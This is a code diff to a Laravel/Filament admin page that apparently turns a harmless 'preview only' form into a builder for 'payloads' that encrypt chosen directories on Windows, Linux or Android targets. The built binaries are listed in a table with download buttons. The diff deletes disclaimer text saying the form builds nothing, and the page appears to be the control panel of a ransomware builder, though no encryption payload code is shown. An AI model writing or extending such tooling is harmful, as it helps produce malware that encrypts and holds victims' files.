@@ -2,21 +2,31 @@
 
 namespace App\Filament\Admin\Pages;
 
+use App\Models\Payload;
+use App\Services\PayloadService;
 use Filament\Actions\Action;
 use Filament\Forms\Components\CheckboxList;
 use Filament\Forms\Components\Section;
 use Filament\Forms\Components\TextInput;
 use Filament\Forms\Components\ToggleButtons;
 use Filament\Forms\Get;
-use Filament\Pages\Page;
 use Filament\Notifications\Notification;
-use App\Services\PayloadService;
+use Filament\Pages\Page;
+use Filament\Tables\Actions\Action as TableAction;
+use Filament\Tables\Columns\TextColumn;
+use Filament\Tables\Concerns\InteractsWithTable;
+use Filament\Tables\Contracts\HasTable;
+use Filament\Tables\Table;
+use Illuminate\Support\Facades\Storage;
 
-class EncryptionApps extends Page
+class EncryptionApps extends Page implements HasTable
 {
+    use InteractsWithTable;
+
+    public ?array $profilePreview = [];
     protected static ?string $title = 'Encryption Apps';
 
-    protected ?string $subheading = 'Configure a local profile for a personal encryption workspace.';
+    protected ?string $subheading = 'Configure and build platform-specific payloads for encryption operations.';
 
     protected static ?string $navigationLabel = 'Encryption Apps';
 
@@ -28,11 +38,49 @@ class EncryptionApps extends Page
 
     protected static string $view = 'filament.admin.pages.encryption-apps';
 
-    public ?array $profilePreview = null;
-
-    public static function getRoutePath(): string
-    {
-        return '/';
+public function table(Table $table): Table
+        {
+            return $table
+                ->query(Payload::query())
+                ->columns([
+                    TextColumn::make('name')
+                        ->label('App Name')
+                        ->searchable()
+                        ->weight('bold'),
+                    TextColumn::make('target_os')
+                        ->label('Platform')
+                        ->badge()
+                        ->color(fn (string $state): string => match ($state) {
+                            'windows' => 'info',
+                            'linux' => 'success',
+                            'android' => 'warning',
+                            default => 'gray',
+                        }),
+                    TextColumn::make('encryption_type')
+                        ->label('Algorithm')
+                        ->formatStateUsing(fn (string $state): string => strtoupper($state)),
+                    TextColumn::make('status')
+                        ->label('Status')
+                        ->badge()
+                        ->color(fn (string $state): string => match ($state) {
+                            'ready' => 'success',
+                            'compiling' => 'warning',
+                            default => 'gray',
+                        }),
+                    TextColumn::make('created_at')
+                        ->label('Created At')
+                        ->dateTime(),
+                ])
+                ->actions([
+                    TableAction::make('download')
+                        ->label('Download')
+                        ->icon('heroicon-o-arrow-down-tray')
+                        ->color('success')
+                        ->button() // <--- هذه الخاصية تجعله يظهر كزر بارز وليس قائمة
+                        ->visible(fn (Payload $record): bool => $record->status === 'ready' && !empty($record->file_path))
+                        ->url(fn (Payload $record): string => Storage::url($record->file_path))
+                        ->openUrlInNewTab(),
+                ]);
     }
 
     protected function getHeaderActions(): array
@@ -42,13 +90,12 @@ class EncryptionApps extends Page
                 ->label('New app')
                 ->icon('heroicon-m-plus')
                 ->color('warning')
-                ->modalHeading('Create a local profile')
-                ->modalDescription('Preview only. This form does not build an app, access files, or save data.')
-                ->modalSubmitActionLabel('Preview profile')
+                ->modalHeading('Create and Compile Payload Profile')
+                ->modalDescription('Configure options to generate a native binary payload for the target platform.')
+                ->modalSubmitActionLabel('Build & Save')
                 ->modalWidth('3xl')
                 ->form([
                     Section::make('App identity')
-                        ->description('Choose a name and a visual mark for your profile.')
                         ->schema([
                             TextInput::make('app_name')
                                 ->label('App name')
@@ -73,7 +120,6 @@ class EncryptionApps extends Page
                         ->columns(2),
 
                     Section::make('Platform & Targets')
-                        ->description('Choose the target platform and directories to encrypt.')
                         ->schema([
                             ToggleButtons::make('platform')
                                 ->label('Target platform')
@@ -126,7 +172,6 @@ class EncryptionApps extends Page
                         ]),
 
                     Section::make('Encryption preset')
-                        ->description('Select a cryptographic profile for this local workspace.')
                         ->schema([
                             ToggleButtons::make('algorithm')
                                 ->label('Encryption type')
@@ -141,13 +186,13 @@ class EncryptionApps extends Page
                         ]),
                 ])
                 ->action(function (array $data, PayloadService $payloadService): void {
-                        $payloadService->createPayloadProfile($data);
-                        Notification::make()
-                        ->title('Payload profile created successfully')
+                    $payloadService->createPayloadProfile($data);
+
+                    Notification::make()
+                        ->title('Payload profile created and built successfully')
                         ->success()
                         ->send();
-    $this->profilePreview = $data;
-})
+                }),
         ];
     }
 }
